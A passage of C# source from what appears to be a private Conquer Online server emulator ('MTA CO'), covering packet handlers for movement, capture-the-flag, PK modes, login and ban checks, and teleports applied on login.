            if (client.Entity.GuildID == 0) return;
            if (!client.Entity.ContainsFlag2(Update.Flags2.CarryingFlag))
            {
                foreach (var item in client.Map.StaticEntities.Values)
                {
                    if (Kernel.GetDistance(item.X, item.Y, client.Entity.X, client.Entity.Y) == 0)
                    {
                        client.Entity.FlagStamp = Time32.Now;

                        client.Send(Program.World.CTF.generateTimer(60));
                        client.Send(Program.World.CTF.generateEffect(client));
                        client.Guild.CTFPoints += 3;
                        client.Entity.AddFlag2(Update.Flags2.CarryingFlag);
                        client.Entity.nAddFlag(118);
                        client.Map.RemoveStaticItem(item);
                        client.RemoveScreenSpawn(item, true);
                    }
                }
            }
            else
            {
                Program.World.CTF.AroundBase(client);
            }
        }
        public static byte[] WindowStats(Client.GameState client)
        {
            Byte[] Data = new Byte[148 + 8];
            Writer.WriteUInt16((UInt16)(Data.Length - 8), 0, Data);
            Writer.WriteUInt16((UInt16)1040, 2, Data);
            Writer.WriteUInt32(client.Entity.UID, 8, Data);
            Writer.WriteUInt32(client.Entity.MaxHitpoints, 12, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MaxMana, 16, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MinAttack, 24, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MaxAttack, 20, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Defence, 28, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MagicAttack, 32, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MagicDefence, 36, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Dodge, 40, Data);
            Writer.WriteUInt32((UInt32)client.AgilityItem, 44, Data);
            Writer.WriteUInt32((UInt32)client.Accuracy, 48, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Gems[1], 52, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Gems[0], 56, Data);
            Writer.WriteUInt32((UInt32)client.MagicDefence, 60, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Gems[7], 64, Data);
            Writer.WriteUInt32((UInt32)((1 - client.Entity.ItemBless) * 100), 68, Data);
            Writer.WriteUInt32((UInt32)client.Entity.CriticalStrike, 72, Data);
            Writer.WriteUInt32((UInt32)client.Entity.SkillCStrike, 76, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Immunity, 80, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Penetration, 84, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Block, 88, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Breaktrough, 92, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Counteraction, 96, Data);
            Writer.WriteUInt32((UInt32)client.Entity.Detoxication, 100, Data);
            Writer.WriteUInt32((UInt32)client.Entity.PhysicalDamageIncrease, 104, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MagicDamageIncrease, 108, Data);
            Writer.WriteUInt32((UInt32)client.Entity.PhysicalDamageDecrease, 112, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MagicDamageDecrease, 116, Data);
            Writer.WriteUInt32((UInt32)client.Entity.MetalResistance, 120, Data);
            Writer.WriteUInt32((UInt32)client.Entity.WoodResistance, 124, Data);
            Writer.WriteUInt32((UInt32)client.Entity.WaterResistance, 128, Data);
            Writer.WriteUInt32((UInt32)client.Entity.FireResistance, 132, Data);
            Writer.WriteUInt32((UInt32)client.Entity.EarthResistance, 136, Data);
            Writer.WriteUInt32((UInt32)client.Entity.PerfectionLevel, 140, Data);
            return Data;
        }

        static void PlayerGroundMovment(GroundMovement groundMovement, Client.GameState client)
        {
            if (client.ProgressBar != null)
                client.ProgressBar.End(client);
            client.Entity.SpellStamp = Time32.Now.AddSeconds(-1);
            client.Entity.KillCount2 = 0;
            client.Entity.Action = MTA.Game.Enums.ConquerAction.None;
            client.Attackable = true;
            client.Mining = false;
            var oldX = client.Entity.X;
            var oldY = client.Entity.Y;
            if (client.Entity.ContainsFlag(Update.Flags.CastPray))
            {
                client.Entity.RemoveFlag(Update.Flags.CastPray);
                foreach (var Client in client.Prayers)
                {
                    if (Client.Entity.ContainsFlag(Update.Flags.Praying))
                    {
                        Client.Entity.RemoveFlag(Update.Flags.Praying);
                    }
                }
                client.Prayers.Clear();
            }
            if (client.Entity.ContainsFlag(Update.Flags.Praying))
            {
                client.Entity.RemoveFlag(Update.Flags.Praying);
                if (client.PrayLead != null)
                    client.PrayLead.Prayers.Remove(client);
                client.PrayLead = null;
            }
            if (client.Entity.AttackPacket != null)
            {
                client.Entity.AttackPacket = null;
            }
            if (client.Entity.ContainsFlag(Update.Flags.Ride)) client.Vigor -= 1;
            client.Entity.PX = client.Entity.X;
            client.Entity.PY = client.Entity.Y;

            if (!client.Entity.Move(groundMovement.Direction, groundMovement.GroundMovementType == GroundMovement.Slide)) return;

            if (client.Entity.MapID == Game.SteedRace.MAPID)
            {
                // if (!Program.World.SteedRace.IsOn)
                {
                    // if (client.Entity.X <= Program.World.SteedRace.GateX + 1)
                    {
                        client.Entity.Teleport(client.Entity.PX, client.Entity.PY);
                        return;
                    }
                }
            }

            if (client.Entity.MapID == Game.SteedRace.MAPID)
                CheckForRaceItems(client);
            if (client.Entity.MapID == CaptureTheFlag.MapID)
                CheckForFlag(client);

            client.SendScreen(groundMovement, true);
            client.Screen.Reload(groundMovement);

            if (client.Entity.InteractionInProgress)
            {
                if (!client.Entity.InteractionSet)
                {
                    if (Kernel.GamePool.ContainsKey(client.Entity.InteractionWith))
                    {
                        Client.GameState ch = Kernel.GamePool[client.Entity.InteractionWith];
                        if (ch.Entity.InteractionInProgress && ch.Entity.InteractionWith == client.Entity.UID)
                        {
                            if (client.Entity.InteractionX == client.Entity.X && client.Entity.Y == client.Entity.InteractionY)
                            {
                                if (client.Entity.X == ch.Entity.X && client.Entity.Y == ch.Entity.Y)
                                {
                                    Network.GamePackets.Attack atac = new Network.GamePackets.Attack(true);
                                    atac.Attacker = ch.Entity.UID;
                                    atac.Attacked = client.Entity.UID;
                                    atac.X = ch.Entity.X;
                                    atac.Y = ch.Entity.Y;
                                    atac.Damage = client.Entity.InteractionType;
                                    atac.ResponseDamage = client.InteractionEffect;
                                    atac.AttackType = 47;
                                    ch.Send(atac);

                                    atac.AttackType = 49;
                                    atac.Attacker = client.Entity.UID;
                                    atac.Attacked = ch.Entity.UID;
                                    client.SendScreen(atac, true);

                                    atac.Attacker = ch.Entity.UID;
                                    atac.Attacked = client.Entity.UID;
                                    client.SendScreen(atac, true);
                                }
                            }
                        }
                    }
                }
                else
                {
                    if (client.Entity.Body == 1003 || client.Entity.Body == 1004)
                    {
                        if (Kernel.GamePool.ContainsKey(client.Entity.InteractionWith))
                        {
                            Client.GameState ch = Kernel.GamePool[client.Entity.InteractionWith];

                            ch.Entity.Facing = groundMovement.Direction;
                            ch.Entity.Move(groundMovement.Direction);
                            Network.GamePackets.Data general = new Network.GamePackets.Data(true);
                            general.UID = ch.Entity.UID;
                            general.wParam1 = ch.Entity.X;
                            general.wParam2 = ch.Entity.Y;
                            general.ID = 0x9c;
                            ch.Send(general.ToArray());
                            ch.Screen.Reload(null);
                        }
                    }
                }
            }
            if (client.Map.BaseID == 1038 && MTA.Game.GuildWar.IsWar)
            {
                MTA.Game.Calculations.IsBreaking(client, oldX, oldY);
            }
            if (!client.Entity.HasMagicDefender)
            {
                if (client.Team != null)
                {
                    var owners = client.Team.Teammates.Where(x => x.Entity.MagicDefenderOwner);
                    if (owners != null)
                    {
                        foreach (var owner in owners)
                        {
                            if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, owner.Entity.X, owner.Entity.Y) <= 4)
                            {
                                client.Entity.HasMagicDefender = true;
                                client.Entity.MagicDefenderStamp = Time32.Now;
                                client.Entity.MagicDefenderSecs = (byte)(owner.Entity.MagicDefenderStamp.AddSeconds(owner.Entity.MagicDefenderSecs) - owner.Entity.MagicDefenderStamp).AllSeconds();
                                client.Entity.AddFlag3(MTA.Network.GamePackets.Update.Flags3.MagicDefender);
                                client.Entity.Update(client.Entity.StatusFlag, client.Entity.StatusFlag2, client.Entity.StatusFlag3, Update.MagicDefenderIcone, 0x80, client.Entity.MagicDefenderSecs, 0, false);
                                break;
                            }
                        }
                    }
                }
            }
            else
            {
                client.Entity.RemoveMagicDefender();
            }
        }
        static void GetSurroundings(Client.GameState client)
        {
            client.Screen.FullWipe();
            client.Screen.Reload(null);
            if (client.Entity.PreviousMapID == CaptureTheFlag.MapID)
                Program.World.CTF.CloseList(client);
        }
        static void ChangeAction(Data generalData, Client.GameState client)
        {
            if (client.ProgressBar != null)
                client.ProgressBar.End(client);
            client.Entity.Action = (ushort)generalData.dwParam;
            if (client.Entity.ContainsFlag(Network.GamePackets.Update.Flags.CastPray))
            {
                foreach (var Client in client.Prayers)
                {
                    generalData.UID = Client.Entity.UID;
                    generalData.dwParam = (uint)client.Entity.Action;
                    generalData.wParam1 = Client.Entity.X;
                    generalData.wParam2 = Client.Entity.Y;
                    Client.Entity.Action = client.Entity.Action;
                    if (Time32.Now >= Client.CoolStamp.AddMilliseconds(1500))
                    {
                        if (Client.Equipment.IsAllSuper())
                            generalData.dwParam = (uint)(generalData.dwParam | (uint)(Client.Entity.Class * 0x10000 + 0x1000000));
                        else if (Client.Equipment.IsArmorSuper())
                            generalData.dwParam = (uint)(generalData.dwParam | (uint)(Client.Entity.Class * 0x10000));
                        Client.SendScreen(generalData, true);
                        Client.CoolStamp = Time32.Now;
                    }
                    else
                        Client.SendScreen(generalData, false);
                }
            }
            generalData.UID = client.Entity.UID;
            generalData.dwParam = (uint)client.Entity.Action;
            if (client.Entity.Action == MTA.Game.Enums.ConquerAction.Cool)
            {
                if (Time32.Now >= client.CoolStamp.AddMilliseconds(1500))
                {
                    if (client.Equipment.IsAllSuper())
                        generalData.dwParam = (uint)(generalData.dwParam | (uint)(client.Entity.Class * 0x10000 + 0x1000000));
                    else if (client.Equipment.IsArmorSuper())
                        generalData.dwParam = (uint)(generalData.dwParam | (uint)(client.Entity.Class * 0x10000));
                    client.SendScreen(generalData, true);
                    client.CoolStamp = Time32.Now;
                }
                else
                    client.SendScreen(generalData, false);
            }
            else
                client.SendScreen(generalData, false);
        }
        static void ChangeDirection(Data generalData, Client.GameState client)
        {
            client.Entity.Facing = (Game.Enums.ConquerAngle)generalData.Facing;
            client.SendScreen(generalData, false);
        }
        static void ChangePKMode(Data generalData, Client.GameState client)
        {
            if (client.InTeamQualifier()) return;
            client.Entity.AttackPacket = null;
            client.Entity.PKMode = (Game.Enums.PkMode)(byte)generalData.dwParam;
            client.Send(generalData);
            if (client.Entity.PKMode == Enums.PkMode.PK)
            {
                client.Send(new MTA.Network.GamePackets.Message("Free PK mode. You can attack monster and all players.", System.Drawing.Color.Red, 0x7d0));
            }
            else if (client.Entity.PKMode == Enums.PkMode.Capture)
            {
                client.Send(new MTA.Network.GamePackets.Message("Capture PK mode. You can only attack monsters, black-name and blue-name players.", System.Drawing.Color.Red, 0x7d0));
            }
            else if (client.Entity.PKMode == Enums.PkMode.Peace)
            {
                client.Send(new MTA.Network.GamePackets.Message("Peace mode. You can only attack monsters.", System.Drawing.Color.Red, 0x7d0));
            }
            else if (client.Entity.PKMode == Enums.PkMode.Team)
            {
                client.Send(new MTA.Network.GamePackets.Message("Team PK mode. You can attack monster and all players except your teammates.", System.Drawing.Color.Red, 0x7d0));
            }
            else if (client.Entity.PKMode == Enums.PkMode.Revenge)
            {
                client.Send(new MTA.Network.GamePackets.Message("Revenge PK mode. You can attack monster and all Your Enemy List Players.", System.Drawing.Color.Red, 0x7d0));
            }
            else if (client.Entity.PKMode == Enums.PkMode.Guild)
            {
                client.Send(new MTA.Network.GamePackets.Message("Guild PK mode. You can attack monster and all Your Guild's Enemies", System.Drawing.Color.Red, 0x7d0));
            }
        }
        static void SetLocation(Data generalData, Client.GameState client)
        {
            SendFlower sendFlower = new SendFlower();
            sendFlower.Typing = (PacketHandler.IsBoy((uint)client.Entity.Body) ? 3u : 2u);
            sendFlower.Apprend(client.Entity.MyFlowers);
            client.Send(sendFlower.ToArray());
            if (client.Entity.MyFlowers.aFlower > 0u)
            {
                client.Send(new SendFlower
                {
                    Typing = PacketHandler.IsBoy((uint)client.Entity.Body) ? 2u : 3u
                }.ToArray());
            }
            client.Send(client.Entity.MyAchievement.ToArray());
            // ElitePKTournament.GiveClientReward(client);
            if (client.Guild != null)
            {
                client.Guild.SendGuild(client);
                GuildMinDonations guildMinDonations = new GuildMinDonations(31);
                guildMinDonations.AprendGuild(client.Guild);
                client.Send(guildMinDonations.ToArray());
            }
            Clan clan = client.Entity.GetClan;
            if (clan != null)
            {
                clan.Build(client, Clan.Types.Info);
                client.Send(clan);

                client.Entity.ClanName = clan.Name;

                client.Send(new ClanRelations(clan, ClanRelations.RelationTypes.Allies));
                client.Send(new ClanRelations(clan, ClanRelations.RelationTypes.Enemies));
            }

            foreach (Game.ConquerStructures.Society.Guild guild in Kernel.Guilds.Values)
            {
                guild.SendName(client);
                guild.SendName(client);
            }

            if (client.Entity.EnlightmentTime > 0)
            {
                Enlight enlight = new Enlight(true);
                enlight.Enlighted = client.Entity.UID;
                enlight.Enlighter = 0;

                if (client.Entity.EnlightmentTime > 80)
                    client.Entity.EnlightmentTime = 100;
                else if (client.Entity.EnlightmentTime > 60)
                    client.Entity.EnlightmentTime = 80;
                else if (client.Entity.EnlightmentTime > 40)
                    client.Entity.EnlightmentTime = 60;
                else if (client.Entity.EnlightmentTime > 20)
                    client.Entity.EnlightmentTime = 40;
                else if (client.Entity.EnlightmentTime > 0)
                    client.Entity.EnlightmentTime = 20;
                for (int count = 0; count < client.Entity.EnlightmentTime; count += 20)
                {
                    client.Send(enlight);
                }
            }

            if (client.Entity.Hitpoints != 0)
            {
                if (client.Map.ID == 1036 || client.Map.ID == 1039)
                {
                    if (client.Entity.PreviousMapID == 0)
                        client.Entity.SetLocation(1002, 301, 266);
                    else
                    {
                        switch (client.Entity.PreviousMapID)
                        {
                            default:
                                {
                                    client.Entity.SetLocation(1002, 300, 278);
                                    break;
                                }
                            case 1000:
                                {
                                    client.Entity.SetLocation(1000, 500, 650);
                                    break;
                                }
                            case 1020:
                                {
                                    client.Entity.SetLocation(1020, 565, 562);
                                    break;
                                }
                            case 1011:
                                {
                                    client.Entity.SetLocation(1011, 188, 264);
                                    break;
                                }
                            case 1015:
                                {
                                    client.Entity.SetLocation(1015, 717, 571);
                                    break;
                                }
                        }
                    }
                }
            }
            else
            {
                if (client.Entity.MapID == 1038 && MTA.Game.GuildWar.IsWar)
                {
                    client.Entity.SetLocation(6001, 31, 74);
                }
                else
                {
                    ushort[] Point = Database.DataHolder.FindReviveSpot(client.Map.ID);
                    client.Entity.SetLocation(Point[0], Point[1], Point[2]);
                }
            }
            generalData.dwParam = client.Map.BaseID;
            generalData.wParam1 = client.Entity.X;
            generalData.wParam2 = client.Entity.Y;
            client.Send(generalData);
            client.Screen.Reload(null);//Done
            client.Screen.FullWipe();
            client.SendScreenSpawn(client.Entity, true);
            client.Screen.Reload(null);
        }

        public static object LoginSyncRoot = new object();

        static void AppendConnect(Connect appendConnect, Client.GameState client)
        {
            if (client.LoggedIn)
            {
                client.Disconnect(true);
                return;
            }
            bool doLogin = false;
            lock (LoginSyncRoot)
            {
                Database.AccountTable Account = null;
                MTA.WebServer.TransferPlayer Player = null;
                if (Kernel.AwaitingPool.TryGetValue(appendConnect.Identifier, out Account))
                {
                    if (!Account.MatchKey(appendConnect.Identifier))
                    {
                        client.Disconnect(false);
                        return;
                    }

                    client.Account = Account;


                    if (client.Account.State == Database.AccountTable.AccountState.Transfered)
                    {
                        client.Send(new Message("Your Charachter has been transfered.", "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.Dialog));
                        return;
                    }
                    if (Account.EntityID == 0)
                    {
                        client.Socket.OverrideTiming = true;
                        client.Send(new Message("NEW_ROLE", "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.Dialog));
                        return;
                    }
                    if (Kernel.DisconnectPool.ContainsKey(Account.EntityID))
                    {
                        client.Send(new Message("Please try again after a minute!", "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.Dialog));
                        return;
                    }
                    VariableVault variables;
                    Database.EntityVariableTable.Load(client.Account.EntityID, out variables);
                    client.Variables = variables;

                    if (client["banhours"] == 0)
                    {
                        client["banhours"] = -1;
                        client["banreason"] = "Infinite time.";
                        client["banstamp"] = DateTime.Now.AddYears(100);
                    }
                    if (Account.State == Database.AccountTable.AccountState.Banned)
                    {
                        if (client["banhours"] != -1)
                        {
                            DateTime banStamp = client["banstamp"];
                            if (DateTime.Now > banStamp.AddDays(((int)client["banhours"]) / 24).AddHours(((int)client["banhours"]) % 24))
                                Account.State = Database.AccountTable.AccountState.Player;
                        }
                    }
                    string Message = "";
                    if (Account.State == Database.AccountTable.AccountState.Banned)
                    {
                        DateTime banStamp = client["banstamp"];
                        banStamp = banStamp.AddHours(client["banhours"]);
                        Message = "You are banned for " + client["banhours"] + " hours [until " + banStamp.ToString("HH:mm MM/dd/yyyy") + "]. Reason: " + client["banreason"];
                    }
                    else if (Account.State == Database.AccountTable.AccountState.NotActivated)
                        Message = "Your account is currently deactivated, please contact the GM.";
                    Kernel.AwaitingPool.Remove(appendConnect.Identifier);
                    if (Message == string.Empty) // ANSWER_OK
                    {
                        Client.GameState aClient = null;
                        if (Kernel.GamePool.TryGetValue(Account.EntityID, out aClient))
                            aClient.Disconnect();
                        Kernel.GamePool.Remove(Account.EntityID);
                        client.Entity = new Entity(EntityFlag.Monster, false);
                        Kernel.GamePool.Add(Account.EntityID, client);
                        doLogin = true;
                    }
                    else
                    {
                        client.Send(new Message(Message, "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.Dialog));
                        World.Execute<GameState>((pClient, time) => { pClient.Disconnect(); }, client, 100);
                    }
                }
                else if (Kernel.TransferPool.TryGetValue(appendConnect.Identifier, out Player))
                {
                    client.GetLanguages(appendConnect.Language);
                    Player.Clone(ref client);
                }
            }
            if (doLogin)
            {
                client.GetLanguages(appendConnect.Language);
                DoLogin(client);
            }
        }

        private static void HeaderUpdates(string update, GameState client)
        {
            client.Send(new GameUpdates(GameUpdates.Header, update));
        }
        private static void BodyUpdates(string update, GameState client)
        {
            client.Send(new GameUpdates(GameUpdates.Body, update));
        }
        private static void FooterUpdates(string update, GameState client)
        {
            client.Send(new GameUpdates(GameUpdates.Footer, update));
        }
        public static ConcurrentDictionary<string, byte[]> TreasurePointsAllowance = new ConcurrentDictionary<string, byte[]>();
        public static object TPASyncRoot = new object();
        public static void AddTPA(GameState client)
        {
            if (!TreasurePointsAllowance.ContainsKey(client.Socket.IP))
                TreasurePointsAllowance.Add(client.Socket.IP, new byte[3]);
            lock (TPASyncRoot)
            {
                byte[] data = TreasurePointsAllowance[client.Socket.IP];
                for (int i = 0; i < data.Length; i++)
                {
                    if (data[i] == 0)
                    {
                        client.AllowedTreasurePoints = true;
                        client.AllowedTreasurePointsIndex = i;
                        data[i] = 1;
                    }
                }
            }
        }
        public static void RemoveTPA(GameState client)
        {
            if (client.AllowedTreasurePoints)
            {
                lock (TPASyncRoot)
                {
                    byte[] data = TreasurePointsAllowance[client.Socket.IP];
                    data[client.AllowedTreasurePointsIndex] = 0;
                }
            }
        }
        static void DoLogin(GameState client)
        {
            client.ReadyToPlay();
            if (Database.EntityTable.LoadEntity(client))
            {
                if (client.Entity.FullyLoaded)
                {
                    AddTPA(client);

                    client.LoadData();


                    if (ItemPosition(client.BackupArmorLook) == ConquerItem.Garment) client.BackupArmorLook = 0;
                    if (ItemPosition(client.ArmorLook) == ConquerItem.Garment) client.ArmorLook = 0;
                    if (client.BackupArmorLook != 0) client.SetNewArmorLook(client.BackupArmorLook);
                    else client.SetNewArmorLook(client.ArmorLook);
                    client.SetNewHeadgearLook(client.HeadgearLook);
                    client.BackupArmorLook = 0;
                    client.SetNewWeaponLook(client.WeaponLook);
                    client.SetNewWeaponLook2(client.WeaponLook2);

                    if (client.Entity.GuildID != 0)
                    {
                        client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(client.Entity.GuildRank);
                    }
                    client.ReviewMentor();

                    #region Game Updates

                    {
                        HeaderUpdates("Welcome to MTA CO!", client);
                        BodyUpdates("GM: xFranko", client);
                        BodyUpdates("PM: Dahshan, Ahmed", client);
                        FooterUpdates("Enjoy!", client);
                    }

                    #endregion
                    if (client.JustCreated)
                    {
                        client.JustCreated = false;
                        client.ItemGive = true;
                        SetLocation(new Data(true) { UID = client.Entity.UID }, client);
                    }
                }
            }
            else
            {
                client.Send(new Message("Cannot find your character.", "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.Dialog));
                client.Disconnect(false);
                return;
            }

            if (Kernel.GamePool.Count >= Program.PlayerCap)
            {
                client.Send(new Message("Player limit exceeded. (Online players: " + Kernel.GamePool + "/" + Program.PlayerCap + ")", "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.Dialog));
                client.Disconnect(false);
                return;
            }

            client.Send(new Message("ANSWER_OK", "ALLUSERS", System.Drawing.Color.Orange, GamePackets.Message.Dialog));
            Program.World.Register(client);
            Kernel.GamePool[client.Account.EntityID] = client;

            Database.EntityTable.UpdateOnlineStatus(client, true);

            client.Send(new GamePackets.CharacterInfo(client));
            string IP = client.IP;
            // var loc = IPtoLocation.GetLocation(IP);
            client.Account.SetCurrentIp(IP);
            client.Account.Save();
            if (!client.LoggedIn)
            {
                Kernel.SendWorldMessage(new Network.GamePackets.Message("Name: " + client.Entity.Name + " VIPLevel: " + client.Entity.VIPLevel + " has logged On Welcome To " + rates.servername + " :OnlinePlayers :  " + Kernel.GamePool.Count, Color.Red, Message.TopLeft), Program.Values);
                Console.WriteLine(client.Entity.Name + " logged in. IP: " + client.Account.IP + "  ");
            }
            new Database.MySqlCommand(Database.MySqlCommandType.UPDATE).Update("configuration").Set("LastPlayer", client.Entity.Name).Set("login", "has logged on").Execute();
            client.LoggedIn = true;
            client.Action = 2;

        }

        #region Water Skills
        public static readonly System.Collections.Generic.List<ushort> Water_skills = new System.Collections.Generic.List<ushort>()
        {
            1195,
            10309,
            1050,
            1280,
            1125,
            1010,
            1055,
            1085,
            1090,
            1095,
            1075,
            1100,
            5001,
            1175,
            1170,
            3090,
            1350,
            30000
        };
        #endregion
        public static void RemoveBadSkills(GameState client)
        {
            if (client.Spells.ContainsKey(10405))
                if (!(client.Entity.FirstRebornClass / 10 == client.Entity.SecondRebornClass / 10 && client.Entity.SecondRebornClass / 10 == client.Entity.Class / 10 && client.Entity.Class / 10 == 6))
                    client.RemoveSpell(new Spell(true) { ID = 10405 });
            if (!client.Spells.ContainsKey(10405))
                if (client.Entity.FirstRebornClass / 10 == client.Entity.SecondRebornClass / 10 && client.Entity.SecondRebornClass / 10 == client.Entity.Class / 10 && client.Entity.Class / 10 == 6)
                    client.AddSpell(new Spell(true) { ID = 10405 });
            //posion star
            //if (client.Spells.ContainsKey(6002))
            //    if (!(client.Entity.FirstRebornClass / 10 == client.Entity.SecondRebornClass / 10 && client.Entity.SecondRebornClass / 10 == client.Entity.Class / 10 && client.Entity.Class / 10 == 5))
            //        client.RemoveSpell(new Spell(true) { ID = 6002 });
            /* if (!client.Spells.ContainsKey(6002))
                 if (client.Entity.FirstRebornClass / 10 == client.Entity.SecondRebornClass / 10 && client.Entity.SecondRebornClass / 10 == client.Entity.Class / 10 && client.Entity.Class / 10 == 5)
                     client.AddSpell(new Spell(true) { ID = 6002 });*/
            if (client.Spells.ContainsKey(6002))
                if (!(client.Entity.SecondRebornClass / 10 == client.Entity.Class / 10 && client.Entity.Class / 10 == 5))
                    client.RemoveSpell(new Spell(true) { ID = 6002 });
            if (!((client.Entity.Class >= 130 && client.Entity.Class <= 135)))
                if (client.Spells.ContainsKey(30000))

                    if (client.Spells.ContainsKey(10309))
                        client.Spells.Remove(10309);
        }

        public static void LoginMessages(Client.GameState client)
        {
            #region AtSteedRace
            if (client.Entity.MapID == 1950) client.Entity.Teleport(1002, 301, 278);
            if (client.Entity.MapID == 2064) client.Entity.Teleport(1002, 301, 278);
            if (client.Entity.MapID == 2063) client.Entity.Teleport(1002, 301, 278);
            if (client.Entity.MapID == 2062) client.Entity.Teleport(1002, 301, 278);
            if (client.Entity.MapID == 2061) client.Entity.Teleport(1002, 301, 278);
            #endregion
            #region Online
            client.Send(new Message("Online players count: " + Kernel.GamePool.Count, System.Drawing.Color.BurlyWood, GamePackets.Message.TopLeft));
            #endregion
            #region CPClaim
            Data datas = new Data(true);
            datas.UID = client.Entity.UID;
            datas.ID = 116;
            datas.dwParam = 1197;
            client.Send(datas);
            #endregion
            client.LoadItemStats();
            #region AtQuests
            if (client.Entity.MapID == 11225 || client.Entity.MapID == 11224)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1234)
                client.Entity.Teleport(1002, 303, 378);
            if (client.Entity.MapID == 4444)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2121)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2222)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2323)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1235)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1236)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1237)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1238)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2014)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3333)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1076)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2071)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 7008)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1040)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2222)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 11042 || client.Entity.MapID == 11030 || client.Entity.MapID == 11034)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2211)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 5451)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1076)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Map.BaseID == 1005 && client.Entity.MapID != 1005)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Map.BaseID == 1005 && client.Entity.MapID != 1005)
                client.Entity.Teleport(1002, 303, 278);
            if (Constants.FBandSSEvent.Contains(client.Entity.MapID)) //FB and SS only! 
                client.Entity.Teleport(1002, 303, 278);
            if (client.Map.BaseID == 1844 || client.Entity.MapID == 1950
                        || client.Entity.MapID == 7777
                        || client.Entity.MapID == 1090 || client.Entity.MapID == 4021
                        || client.Entity.MapID == 4022 || client.Entity.MapID == 4023
                        || client.Entity.MapID == 4024 || client.Entity.MapID == 4025
                        || client.Entity.MapID == 1508 || client.Entity.MapID == 1518
                        || client.Entity.MapID == 7001 || client.Entity.MapID == 1801
                        || client.Entity.MapID == 2065 || client.Entity.MapID == 8883
                        || client.Entity.MapID == 2057 || client.Entity.MapID == 1458
                        || client.Entity.MapID == 1459 || client.Entity.MapID == 1460
                        || client.Entity.MapID == 3033
                        || client.Entity.MapID == 16414 || client.Entity.MapID == 1645)
                client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3073) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3691) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3692) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3693) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3694) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3071) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2530) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2529) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2528) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2527) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2526) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2525) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3070) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 33333) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3320) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3321) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3322) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 5528) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1702) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1701) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 3033) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8510) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1024) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1090) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8511) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8512) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8513) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8514) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8515) client.Entity.Teleport(1002, 303, 278);
